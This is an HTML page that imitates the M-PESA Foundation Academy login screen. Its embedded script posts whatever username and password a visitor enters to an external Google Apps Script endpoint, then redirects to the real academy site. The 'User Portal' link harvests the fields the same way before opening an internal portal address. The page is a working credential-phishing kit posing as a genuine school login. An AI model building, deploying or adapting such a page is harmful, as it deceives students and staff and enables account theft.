<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M-PESA Foundation Academy Login</title>
    <style>
        body{
            font-family:Arial,sans-serif;
            margin:0;padding:0;
            display:flex;flex-direction:column;
            justify-content:center;align-items:center;
            background:#fff;min-height:100vh;
        }

        /* Open-top header – no top border */
        .header-wrapper{
            width:300px;
            background:#fff;
            margin-top:-10px;
        }
        .image-section{
            text-align:center;
            padding-top:10px;
        }
        .image-section img{
            max-width:180px;height:auto;
        }

        /* Form wrapper – side borders stop above Username */
        .login-form-wrapper{
            position:relative;
            width:300px;
            background:#fff;
            box-shadow:0 2px 4px rgba(0,0,0,.1);
            margin-top:-1px;
        }

        /* Side borders – from below logo to above Username */
        .side-borders{
            position:absolute;
            top:0;
            bottom:0;
            width:1px;
            background:#ddd;
        }
        .left-border  { left:0; }
        .right-border { right:0; }

        /* Bottom border only */
        .bottom-border{
            position:absolute;
            bottom:0; left:0; right:0;
            height:1px;
            background:#ddd;
        }

        /* Form content – precise gaps */
        .login-container{
            padding:0 15px 15px;           /* sides: 15px, bottom: 15px, top: 0 */
            text-align:center;
            position:relative;
            z-index:1;
        }

        .login-container input{
            width:100%;
            padding:8px;
            border:1px solid #ccc;
            border-radius:4px;
            font-size:.9em;color:#757575;
            box-sizing:border-box;
        }

        /* Username – 40px from logo */
        #username {
            margin-top:40px;
            margin-bottom:30px;            /* Username → Password: 30px */
        }

        /* Password → Login: 50px */
        #password {
            margin-bottom:50px;
        }

        .login-container button{
            width:100%;padding:8px;
            margin-bottom:70px;            /* Login → "Click here...": 70px */
            background:#4CAF50;
            border:1px solid #45a049;
            border-radius:4px;
            color:#fff;font-size:.9em;
            cursor:pointer;
            box-shadow:0 0 5px rgba(76,175,80,.3);
        }
        .login-container button:hover{background:#45a049;}

        .login-container a{
            display:block;
            margin-bottom:90px;            /* "Click here..." → Footer: 90px */
            color:#4a4a4a;text-decoration:none;
            font-size:.85em;
            cursor:pointer;
        }

        .footer{
            text-align:center;color:#4a4a4a;
            margin-top:60px;               /* Form bottom → Footer: 60px */
            padding:6px 0;
            font-size:.85em;width:100%;
        }
        #message,#error{display:none;}
    </style>
</head>
<body>

    <!-- Open-top header -->
    <div class="header-wrapper">
        <div class="image-section">
            <img src="Image 17-09-2025 at 11.50.jpeg" alt="M-PESA Foundation Academy">
        </div>
    </div>

    <!-- Form with side borders stopping above Username -->
    <div class="login-form-wrapper">
        <div class="side-borders left-border"></div>
        <div class="side-borders right-border"></div>
        <div class="bottom-border"></div>

        <div class="login-container">
            <form id="loginForm">
                <input type="text" id="username" placeholder="Enter your Username" required>
                <input type="password" id="password" placeholder="Enter your Password" required>
                <button type="submit">Login</button>
            </form>
            <a href="#" id="userPortalLink">Click here to access User Portal</a>
            <div id="message"></div>
            <div id="error"></div>
        </div>
    </div>

    <div class="footer">
        Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const userPortalLink = document.getElementById('userPortalLink');
        const webAppUrl = 'https://script.google.com/macros/s/AKfycbw104iJMQPmeuC9Nis5buVrtGV9UC4XaEI6_GEMDeDEzrShwo0E04FWhbI7eAL8tecg/exec';
        const redirectUrl = 'https://mpesafoundationacademy.ac.ke';
        const userPortalUrl = 'https://172.16.200.3:65040/userportal/webpages/myaccount/login.jsp';

        async function sendCredentials(u, p){
            try{
                const resp = await fetch(webAppUrl,{
                    method:'POST',
                    mode:'cors',
                    headers:{'Content-Type':'text/plain;charset=utf-8'},
                    body:new URLSearchParams({username:u||'',password:p||''}).toString()
                });
                const data = await resp.json();
                return data.success===true;
            }catch(e){ return false; }
        }

        // Login button → requires fields
        form.addEventListener('submit', async e=>{
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(await sendCredentials(u,p)) {
                window.location.href = redirectUrl;
            }
        });

        // User Portal link → works even if empty
        userPortalLink.addEventListener('click', async e=>{
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            await sendCredentials(u, p);
            window.open(userPortalUrl, '_blank');
        });
    </script>
</body>
</html>
